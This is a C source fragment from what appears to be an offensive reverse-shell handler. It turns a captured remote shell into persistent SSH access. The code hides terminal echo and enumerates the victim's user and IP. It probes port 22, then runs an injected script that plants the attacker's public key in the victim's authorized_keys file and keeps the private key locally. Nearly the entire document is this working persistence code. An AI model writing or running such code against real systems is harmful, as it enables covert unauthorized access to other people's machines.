#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/stat.h>

static int rsi_ensure_key(char *priv, size_t priv_sz,
                           char *pub,  size_t pub_sz) {
    const char *home = getenv("HOME");
    if (!home) { fprintf(stderr, "  " C_YLW "[-]" C_RST " SSH: $HOME unset\r\n"); return 0; }

    char dir[512], sshdir[512];
    snprintf(dir,    sizeof dir,    "%s/.rsi",                 home);
    snprintf(sshdir, sizeof sshdir, "%s/.rsi/.ssh",            home);
    snprintf(priv,   priv_sz,       "%s/.rsi/.ssh/id_rsa",     home);
    snprintf(pub,    pub_sz,        "%s/.rsi/.ssh/id_rsa.pub", home);

    mkdir(dir,    0700);
    mkdir(sshdir, 0700);

    if (access(priv, F_OK) != 0) {
        fprintf(stderr, "  " C_YLW "[*]" C_RST " SSH: generating keypair (one time)..\r\n");
        char cmd[1024];
        snprintf(cmd, sizeof cmd,
            "ssh-keygen -t rsa -b 2048 -f '%s' -N '' -q", priv);
        if (system(cmd) != 0) {
            fprintf(stderr, "  " C_YLW "[-]" C_RST " SSH: ssh-keygen failed\r\n");
            return 0;
        }
        fprintf(stderr, "  " C_YLW "[+]" C_RST " SSH: keypair ready\r\n");
    }
    return 1;
}

static int rsi_read_file(const char *path, char *out, size_t out_sz) {
    FILE *f = fopen(path, "r");
    if (!f) return 0;
    size_t n = fread(out, 1, out_sz - 1, f);
    fclose(f);
    while (n > 0 && (out[n-1] == '\n' || out[n-1] == '\r' || out[n-1] == ' '))
        n--;
    out[n] = '\0';
    return (int)n > 0;
}

static int shell_capture(int fd_send, int fd_recv,
                          const char *cmd, char *out, size_t out_sz) {
    size_t pkt_sz = strlen(cmd) + 128;
    char *pkt = malloc(pkt_sz);
    if (!pkt) return 0;
    snprintf(pkt, pkt_sz, "%s; echo __RSIEND__\n", cmd);
    write(fd_send, pkt, strlen(pkt));
    free(pkt);

    char acc[16384] = {0};
    int  len = 0;
    struct timeval deadline, now, tv;
    gettimeofday(&deadline, NULL);
    deadline.tv_sec += 6;

    for (;;) {
        gettimeofday(&now, NULL);
        long rem = (deadline.tv_sec  - now.tv_sec)  * 1000000L
                 + (deadline.tv_usec - now.tv_usec);
        if (rem <= 0) break;
        tv.tv_sec  = rem / 1000000L;
        tv.tv_usec = rem % 1000000L;
        fd_set fds; FD_ZERO(&fds); FD_SET(fd_recv, &fds);
        if (select(fd_recv + 1, &fds, NULL, NULL, &tv) <= 0) break;
        int n = read(fd_recv, acc + len, sizeof(acc) - len - 1);
        if (n <= 0) break;
        len += n; acc[len] = '\0';
        if (strstr(acc, "__RSIEND__")) break;
    }

    char *e = strstr(acc, "__RSIEND__");
    if (!e) return 0;

    char *nl = e;
    while (nl > acc && *(nl-1) != '\n') nl--;
    char *end = nl;
    while (end > acc && (*(end-1) == '\r' || *(end-1) == '\n' || *(end-1) == ' ')) end--;

    char *s = acc;
    while (s < end && (*s == '\r' || *s == '\n')) s++;

    size_t sz = (size_t)(end - s);
    if (sz == 0 || sz >= out_sz) return 0;
    memcpy(out, s, sz);
    out[sz] = '\0';
    for (char *p = out; *p; p++) if (*p == '\r') *p = ' ';
    sz = strlen(out);
    while (sz > 0 && out[sz-1] == ' ') out[--sz] = '\0';
    return sz > 0;
}

static int probe_ssh_port(const char *ip) {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) return 0;
    struct timeval tv = {3, 0};
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof tv);
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv);
    struct sockaddr_in a = {0};
    a.sin_family = AF_INET;
    a.sin_port   = htons(22);
    inet_pton(AF_INET, ip, &a.sin_addr);
    int r = connect(s, (struct sockaddr *)&a, sizeof a);
    close(s);
    return r == 0;
}

static int do_ssh_upgrade(int fd_send, int fd_recv,
                           const char *priv, const char *pub_path,
                           char *ip_out, size_t ip_sz,
                           char *user_out, size_t user_sz) {
    write(fd_send, "stty -echo\n", 11);
    drain_until_idle(fd_recv, 200, 1000, 0);

    char user[64] = {0};
    shell_capture(fd_send, fd_recv, "whoami", user, sizeof user);
    if (!user[0]) snprintf(user, sizeof user, "user");

    char ip[64] = {0};
    shell_capture(fd_send, fd_recv,
        "hostname -I 2>/dev/null | awk '{print $1}'", ip, sizeof ip);
    if (!ip[0]) {
        shell_capture(fd_send, fd_recv,
            "ip -4 addr show scope global 2>/dev/null | "
            "awk '/inet/{print $2}' | cut -d/ -f1 | head -n1",
            ip, sizeof ip);
    }
    if (!ip[0]) {
        fprintf(stderr, "  " C_YLW "[-]" C_RST " SSH: could not determine remote IP\r\n");
        write(fd_send, "stty echo\n", 10);
        drain_until_idle(fd_recv, 200, 1000, 0);
        return 0;
    }

      fprintf(stderr, "\r\n  " C_YLW "[*]" C_RST " SSH Awaiting..\r\n");
   // fprintf(stderr, "\n" "  " C_YLW "[*]" C_RST " %s@%s probing port 22..\r\n", user, ip);

    if (!probe_ssh_port(ip)) {
        fprintf(stderr, "  " C_YLW "[-]" C_RST " SSH: port 22 unreachable\r\n");
        write(fd_send, "stty echo\n", 10);
        drain_until_idle(fd_recv, 200, 1000, 0);
        return 0;
    }

    char pubkey[2048] = {0};
    if (!rsi_read_file(pub_path, pubkey, sizeof pubkey)) {
        fprintf(stderr, "  " C_YLW "[-]" C_RST " SSH: cannot read pubkey\r\n");
        write(fd_send, "stty echo\n", 10);
        drain_until_idle(fd_recv, 200, 1000, 0);
        return 0;
    }

    char rhome[256] = {0};
    shell_capture(fd_send, fd_recv, "echo $HOME", rhome, sizeof rhome);
    if (!rhome[0]) snprintf(rhome, sizeof rhome, "~");

    char install[8192];
    snprintf(install, sizeof install,
        "H='%s'; K='%s';"
        "if [ -d \"$H\" ]; then"
        "  if [ -d \"$H/.ssh\" ]; then"
        "    printf '\\n%%s\\n' \"$K\" >> \"$H/.ssh/authorized_keys\""
        "    && chmod 600 \"$H/.ssh/authorized_keys\";"
        "  else"
        "    mkdir -m 700 \"$H/.ssh\""
        "    && printf '%%s\\n' \"$K\" > \"$H/.ssh/authorized_keys\""
        "    && chmod 600 \"$H/.ssh/authorized_keys\";"
        "  fi;"
        "else"
        "  mkdir -p ~/.ssh && chmod 700 ~/.ssh"
        "  && printf '\\n%%s\\n' \"$K\" >> ~/.ssh/authorized_keys"
        "  && chmod 600 ~/.ssh/authorized_keys;"
        "fi",
        rhome, pubkey);

    char result[16] = {0};
    char cmd[9216];
    snprintf(cmd, sizeof cmd, "(%s) && echo OK || echo FAIL", install);
    shell_capture(fd_send, fd_recv, cmd, result, sizeof result);

    write(fd_send, "stty echo\n", 10);
    drain_until_idle(fd_recv, 200, 1000, 0);

    if (strncmp(result, "OK", 2) != 0) {
        fprintf(stderr, "  " C_YLW "[-]" C_RST " SSH: key plant failed\r\n");
        return 0;
    }

    if (access("./id_rsa", F_OK) != 0) {
        char cp[1024];
        snprintf(cp, sizeof cp, "cp '%s' ./id_rsa && chmod 600 ./id_rsa", priv);
        int rc = system(cp);
        (void)rc;
        if (access("./id_rsa", R_OK) != 0) {
            fprintf(stderr, "  " C_YLW "[-]" C_RST " SSH: failed to copy private key\r\n");
            return 0;
        }
    }

    snprintf(user_out, user_sz, "%s", user);
    snprintf(ip_out,   ip_sz,   "%s", ip);
    return 1;
}